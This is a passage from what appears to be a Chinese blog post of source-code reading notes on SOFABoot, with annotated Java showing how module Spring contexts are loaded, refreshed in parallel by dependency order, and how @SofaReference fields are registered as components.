href="#加载SpringContext配置文件" class="headerlink" title="加载SpringContext配置文件"></a>加载SpringContext配置文件</h6><ul><li>SpringContextInstallStage.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载SpringContext配置文件</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">installSpringContext</span><span class="params">(ApplicationRuntimeModel application,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    SpringContextLoader springContextLoader)</span> </span>&#123;</span><br><span class="line">    ClassLoader oldClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 循环处理依赖的模块：sofa-module.properties</span></span><br><span class="line">    <span class="keyword">for</span> (DeploymentDescriptor deployment : application.getResolvedDeployments()) &#123;</span><br><span class="line">        <span class="comment">// 判断是否有Spring配置文件</span></span><br><span class="line">        <span class="keyword">if</span> (deployment.isSpringPowered()) &#123;</span><br><span class="line">            <span class="comment">// Start install SqBiz Main's module: cn.aezo.sqbiz.sqbiz-plugin.service-provider</span></span><br><span class="line">            SofaLogger.info(<span class="string">"Start install "</span> + application.getAppName() + <span class="string">"'s module: "</span></span><br><span class="line">                            + deployment.getName());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 记录加载器，如：BizClassLoader(bizIdentity=Startup In IDE:Mock version)</span></span><br><span class="line">                Thread.currentThread().setContextClassLoader(deployment.getClassLoader());</span><br><span class="line">                <span class="comment">// 参考上文[创建模块的SpringContextLoader(上下文加载器)](#创建模块的SpringContextLoader(上下文加载器))</span></span><br><span class="line">                springContextLoader.loadSpringContext(deployment, application);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                SofaLogger.error(<span class="string">"Install module &#123;&#125; got an error!"</span>, deployment.getName(), t);</span><br><span class="line">                application.addFailed(deployment);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                Thread.currentThread().setContextClassLoader(oldClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>AbstractDeploymentDescriptor.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractDeploymentDescriptor</span> <span class="keyword">implements</span> <span class="title">DeploymentDescriptor</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Spring配置文件</span></span><br><span class="line">    Map&lt;String, Resource&gt;                   springResources;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSpringPowered</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 配置文件不存在则先读取XML文件</span></span><br><span class="line">        <span class="keyword">if</span> (springResources == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.loadSpringXMLs();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果存在配置文件，则说明存在Spring上下文环境，之后可进行刷新SpringContext</span></span><br><span class="line">        <span class="keyword">return</span> !springResources.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>FileDeploymentDescriptor.java 基于文件安装的模块，另外一个实现是基于Jar(JarDeploymentDescriptor)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDeploymentDescriptor</span> <span class="keyword">extends</span> <span class="title">AbstractDeploymentDescriptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadSpringXMLs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        springResources = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// When path contains special characters (e.g., white space, Chinese), URL converts them to UTF8 code point.</span></span><br><span class="line">            <span class="comment">// In order to processing correctly, create File from URI</span></span><br><span class="line">            <span class="comment">// Spring配置文件目录, 如: C:\Users\smalle\Desktop\sofa-ark-dynamic-guides-master\ark-dynamic-module\target\classes\META-INF\spring</span></span><br><span class="line">            URI springXmlUri = <span class="keyword">new</span> URI(<span class="string">"file://"</span></span><br><span class="line">                                       + url.getFile().substring(</span><br><span class="line">                                           <span class="number">0</span>,</span><br><span class="line">                                           url.getFile().length()</span><br><span class="line">                                                   - SofaBootConstants.SOFA_MODULE_FILE.length())</span><br><span class="line">                                       + SofaBootConstants.SPRING_CONTEXT_PATH); <span class="comment">// META-INF/spring</span></span><br><span class="line">            File springXml = <span class="keyword">new</span> File(springXmlUri);</span><br><span class="line">            List&lt;File&gt; springFiles = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">if</span> (springXml.exists()) &#123;</span><br><span class="line">                listFiles(springFiles, springXml, <span class="string">".xml"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (File f : springFiles) &#123;</span><br><span class="line">                <span class="comment">// 保存到 springResources 缓存中</span></span><br><span class="line">                springResources.put(f.getAbsolutePath(), <span class="keyword">new</span> FileSystemResource(f));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="并行刷新SpringContext"><a href="#并行刷新SpringContext" class="headerlink" title="并行刷新SpringContext"></a>并行刷新SpringContext</h6><ul><li>SpringContextInstallStage.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">refreshSpringContextParallel</span><span class="params">(ApplicationRuntimeModel application)</span> </span>&#123;</span><br><span class="line">    ClassLoader oldClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    List&lt;DeploymentDescriptor&gt; coreRoots = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="comment">// 定义线程执行器，初始化模块时的线程名如：sofa-module-start-cn.aezo.sqbiz.sqbiz-plugin.service-provider</span></span><br><span class="line">    ThreadPoolExecutor executor = <span class="keyword">new</span> SofaThreadPoolExecutor(CPU_COUNT + <span class="number">1</span>, CPU_COUNT + <span class="number">1</span>, <span class="number">60</span>,</span><br><span class="line">        TimeUnit.MILLISECONDS, <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;(), <span class="keyword">new</span> NamedThreadFactory(</span><br><span class="line">            <span class="string">"sofa-module-start"</span>), <span class="keyword">new</span> ThreadPoolExecutor.CallerRunsPolicy(),</span><br><span class="line">        <span class="string">"sofa-module-start"</span>, <span class="string">"sofa-boot"</span>, <span class="number">60</span>, <span class="number">30</span>, TimeUnit.SECONDS);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 循环处理依赖的模块：sofa-module.properties</span></span><br><span class="line">        <span class="keyword">for</span> (DeploymentDescriptor deployment : application.getResolvedDeployments()) &#123;</span><br><span class="line">            DependencyTree.Entry entry = application.getDeployRegistry().getEntry(</span><br><span class="line">                deployment.getModuleName());</span><br><span class="line">            <span class="comment">// 判断当前模块是否有依赖, Require-Module</span></span><br><span class="line">            <span class="keyword">if</span> (entry != <span class="keyword">null</span> &amp;&amp; entry.getDependencies() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                coreRoots.add(deployment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 处理底层(被依赖)模块，内部包含了处理上层调用模块，具体见下文</span></span><br><span class="line">        refreshSpringContextParallel(coreRoots, application.getResolvedDeployments().size(),</span><br><span class="line">            application, executor);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        executor.shutdown();</span><br><span class="line">        Thread.currentThread().setContextClassLoader(oldClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">refreshSpringContextParallel</span><span class="params">(List&lt;DeploymentDescriptor&gt; rootDeployments,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              <span class="keyword">int</span> totalSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              <span class="keyword">final</span> ApplicationRuntimeModel application,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              <span class="keyword">final</span> ThreadPoolExecutor executor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootDeployments == <span class="keyword">null</span> || rootDeployments.size() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(totalSize);</span><br><span class="line">    List&lt;Future&gt; futures = <span class="keyword">new</span> CopyOnWriteArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 依次处理每个模块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> DeploymentDescriptor deployment : rootDeployments) &#123;</span><br><span class="line">        refreshSpringContextParallel(deployment, application, executor, latch, futures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        latch.await();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Wait for Sofa Module Refresh Fail"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Future future : futures) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            future.get();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 某个模块处理逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">refreshSpringContextParallel</span><span class="params">(<span class="keyword">final</span> DeploymentDescriptor deployment,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              <span class="keyword">final</span> ApplicationRuntimeModel application,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              <span class="keyword">final</span> ThreadPoolExecutor executor,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              <span class="keyword">final</span> CountDownLatch latch, <span class="keyword">final</span> List&lt;Future&gt; futures)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 提交任务</span></span><br><span class="line">    futures.add(executor.submit(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 任务逻辑</span></span><br><span class="line">            String oldName = Thread.currentThread().getName();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.currentThread().setName(</span><br><span class="line">                    <span class="string">"sofa-module-start-"</span> + deployment.getModuleName());</span><br><span class="line">                Thread.currentThread().setContextClassLoader(deployment.getClassLoader());</span><br><span class="line">                <span class="keyword">if</span> (deployment.isSpringPowered()</span><br><span class="line">                    &amp;&amp; !application.getFailed().contains(deployment)) &#123;</span><br><span class="line">                    <span class="comment">// 是Spring应用，且加载成功时执行</span></span><br><span class="line">                    doRefreshSpringContext(deployment, application);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 当前模块</span></span><br><span class="line">                DependencyTree.Entry&lt;String, DeploymentDescriptor&gt; entry = application</span><br><span class="line">                    .getDeployRegistry().getEntry(deployment.getModuleName());</span><br><span class="line">                <span class="keyword">if</span> (entry != <span class="keyword">null</span> &amp;&amp; entry.getDependsOnMe() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 循环初始化依赖我的模块(初始化上层调用模块)</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">final</span> DependencyTree.Entry&lt;String, DeploymentDescriptor&gt; child : entry</span><br><span class="line">                        .getDependsOnMe()) &#123;</span><br><span class="line">                        child.getDependencies().remove(entry);</span><br><span class="line">                        <span class="keyword">if</span> (child.getDependencies().size() == <span class="number">0</span>) &#123;</span><br><span class="line">                            refreshSpringContextParallel(child.get(), application, executor,</span><br><span class="line">                                latch, futures);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doRefreshSpringContext</span><span class="params">(DeploymentDescriptor deployment,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          ApplicationRuntimeModel application)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Begin refresh Spring Application Context of module cn.aezo.sqbiz.sqbiz-plugin.service-provider of application SqBiz Main.</span></span><br><span class="line">    SofaLogger.info(<span class="string">"Begin refresh Spring Application Context of module &#123;&#125; of application &#123;&#125;."</span>,</span><br><span class="line">        deployment.getName(), application.getAppName());</span><br><span class="line">    <span class="comment">// 获取模块的上下文</span></span><br><span class="line">    ConfigurableApplicationContext ctx = (ConfigurableApplicationContext) deployment</span><br><span class="line">        .getApplicationContext();</span><br><span class="line">    <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            deployment.startDeploy(); <span class="comment">// 只是记录一下时间</span></span><br><span class="line">            <span class="comment">// 刷新，即调用 ApplicationContext#refresh 方法。参考上文[ServiceComponent为例](#ServiceComponent为例)</span></span><br><span class="line">            <span class="comment">// 依次打印日志：Registering component - &lt;&lt;PreOut Binding - &lt;&lt;Out Binding - Register Service</span></span><br><span class="line">            ctx.refresh();</span><br><span class="line">            <span class="comment">// 注册SpringContext组件，参考上文[SpringContextComponent为例](#SpringContextComponent为例)。方法详细参考下文</span></span><br><span class="line">            publishContextAsSofaComponent(deployment, application, ctx);</span><br><span class="line">            application.addInstalled(deployment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            SofaLogger.error(</span><br><span class="line">                <span class="string">"Refreshing Spring Application Context of module &#123;&#125; got an error."</span>,</span><br><span class="line">                deployment.getName(), t);</span><br><span class="line">            application.addFailed(deployment);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            deployment.deployFinish();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String errorMsg = <span class="string">"Spring Application Context of module "</span> + deployment.getName()</span><br><span class="line">                            + <span class="string">" is null!"</span>;</span><br><span class="line">        application.addFailed(deployment);</span><br><span class="line">        SofaLogger.error(errorMsg, <span class="keyword">new</span> RuntimeException(errorMsg));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">publishContextAsSofaComponent</span><span class="params">(DeploymentDescriptor deployment,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               ApplicationRuntimeModel application,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               ApplicationContext context)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实例化</span></span><br><span class="line">    ComponentName componentName = ComponentNameFactory.createComponentName(</span><br><span class="line">        SpringContextComponent.SPRING_COMPONENT_TYPE, deployment.getModuleName());</span><br><span class="line">    Implementation implementation = <span class="keyword">new</span> SpringContextImplementation(context);</span><br><span class="line">    ComponentInfo componentInfo = <span class="keyword">new</span> SpringContextComponent(componentName, implementation,</span><br><span class="line">        application.getSofaRuntimeContext());</span><br><span class="line">    <span class="comment">// 注册</span></span><br><span class="line">    application.getSofaRuntimeContext().getComponentManager().register(componentInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="runtime-sofa-boot"><a href="#runtime-sofa-boot" class="headerlink" title="runtime-sofa-boot"></a>runtime-sofa-boot</h2><ul><li>runtime-sofa-boot-starter-3.1.4.jar</li></ul><h3 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h3><ul><li><strong>基于SofaBoot的简单模块隔离，或者基于多Ark Biz启动，都会用到此包</strong></li><li>主要是管理组件(Component, 本质是Bean/服务. 包括ReferenceComponent,ServiceComponent,SpringContextComponent)生命周期</li><li>组件管理类ComponentManagerImpl<ul><li>register/registerAndGet 注册组件<ul><li>服务端Biz, 其Spring初始化时调用，如：ServiceFactoryBean(通过扫描含@SofaReference注解的Bean)、ExtensionFactoryBean</li><li>服务端基于API初始化时调用：ServiceClientImpl、ExtensionClientImpl</li><li>客户端Biz初始化@SofaReference应用，ReferenceRegisterHelper<ul><li>ReferenceFactoryBean(InitializingBean)</li><li>ReferenceAnnotationBeanPostProcessor(BeanPostProcessor)</li><li>ReferenceClientImpl 客户端基于API注册引用</li></ul></li></ul></li></ul></li><li>Spring初始化时，会调用其 postProcessBeforeInitialization 方法<ul><li>如根据<code>@SofaReference</code>注解，将组件信息(此时为ReferenceComponent类)保存到ComponentManagerImpl#registry集合中，集合中的key为ComponentName类型<ul><li>此时ComponentName如：<code>reference:com.alipay.sofa.isle.sample.SampleJvmService:#2120635923</code>(reference表示基于此注解解析的引用信息，会创建其代理对象)</li></ul></li><li>如根据<code>@SofaService</code>注解，将组件信息(此时为ServiceComponent类)保存到registry集合中</li></ul></li></ul><h4 id="BeanPostProcessor注册组件入口"><a href="#BeanPostProcessor注册组件入口" class="headerlink" title="BeanPostProcessor注册组件入口"></a>BeanPostProcessor注册组件入口</h4><h5 id="ReferenceAnnotationBeanPostProcessor为例"><a href="#ReferenceAnnotationBeanPostProcessor为例" class="headerlink" title="ReferenceAnnotationBeanPostProcessor为例"></a>ReferenceAnnotationBeanPostProcessor为例</h5><ul><li>ReferenceAnnotationBeanPostProcessor.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceAnnotationBeanPostProcessor</span> <span class="keyword">implements</span> <span class="title">BeanPostProcessor</span>, <span class="title">PriorityOrdered</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Spring初始化时，会调用其此方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span></span><br><span class="line"><span class="function">                                                                               <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        processSofaReference(bean);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processSofaReference</span><span class="params">(<span class="keyword">final</span> Object bean)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 被Spring扫描的Bean</span></span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; beanClass = bean.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Bean的所有属性，并执行回调</span></span><br><span class="line">        ReflectionUtils.doWithFields(beanClass, <span class="keyword">new</span> ReflectionUtils.FieldCallback() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doWith</span><span class="params">(Field field)</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException </span>&#123;</span><br><span class="line">                AnnotationWrapperBuilder&lt;SofaReference&gt; builder = AnnotationWrapperBuilder.wrap(</span><br><span class="line">                    field.getAnnotation(SofaReference.class)).withBinder(binder);</span><br><span class="line">                SofaReference sofaReferenceAnnotation = builder.build();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (sofaReferenceAnnotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Class&lt;?&gt; interfaceType = sofaReferenceAnnotation.interfaceType();</span><br><span class="line">                <span class="keyword">if</span> (interfaceType.equals(<span class="keyword">void</span>.class)) &#123;</span><br><span class="line">                    interfaceType = field.getType();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 创建ReferenceComponent的代理对象，并注册，具体参考下文</span></span><br><span class="line">                Object proxy = createReferenceProxy(sofaReferenceAnnotation, interfaceType);</span><br><span class="line">                ReflectionUtils.makeAccessible(field);</span><br><span class="line">                <span class="comment">// 将代理对象设置为此属性值</span></span><br><span class="line">                ReflectionUtils.setField(field, bean, proxy);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="keyword">new</span> ReflectionUtils.FieldFilter() &#123; <span class="comment">// 字段过滤器，符合要求的才执行回调</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(Field field)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!field.isAnnotationPresent(SofaReference.class)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (Modifier.isStatic(field.getModifiers())) &#123;</span><br><span class="line">                    SofaLogger.warn(</span><br><span class="line">                        <span class="string">"SofaReference annotation is not supported on static fields: 